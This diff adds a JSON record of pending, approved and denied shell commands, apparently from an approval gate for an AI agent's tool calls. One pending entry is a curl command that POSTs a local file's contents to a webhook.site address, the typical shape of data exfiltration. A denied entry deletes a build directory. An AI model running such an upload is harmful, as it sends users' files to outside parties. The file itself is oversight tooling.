@@ -1,0 +1,47 @@
+{
+  "approvals": {
+    "2cc57c48": {
+      "call_id": "2cc57c48",
+      "command": "curl -X POST https://webhook.site/abc -d \u00abredacted-path\u00bb",
+      "pattern": "curl -X POST <url> -d @<path>",
+      "why": {
+        "policy_ids": [],
+        "answers": null,
+        "decision_reason": "jev_outage"
+      },
+      "status": "pending",
+      "choice": null,
+      "decided_at": null
+    },
+    "0f37cdeb": {
+      "call_id": "0f37cdeb",
+      "command": "echo hello",
+      "pattern": "echo hello",
+      "why": {
+        "policy_ids": [],
+        "answers": null,
+        "decision_reason": "jev_outage"
+      },
+      "status": "approved_once",
+      "choice": "approve_once",
+      "decided_at": "2026-09-29T14:12:43.296045+00:00"
+    },
+    "9650cd5b": {
+      "call_id": "9650cd5b",
+      "command": "rm -rf /tmp/build",
+      "pattern": "rm -rf <path>",
+      "why": {
+        "policy_ids": [],
+        "answers": null,
+        "decision_reason": "jev_outage"
+      },
+      "status": "denied",
+      "choice": "deny",
+      "decided_at": "2026-09-29T14:12:43.296520+00:00"
+    }
+  },
+  "one_shot_approved": [
+    "echo hello"
+  ],
+  "session_approved": []
+}
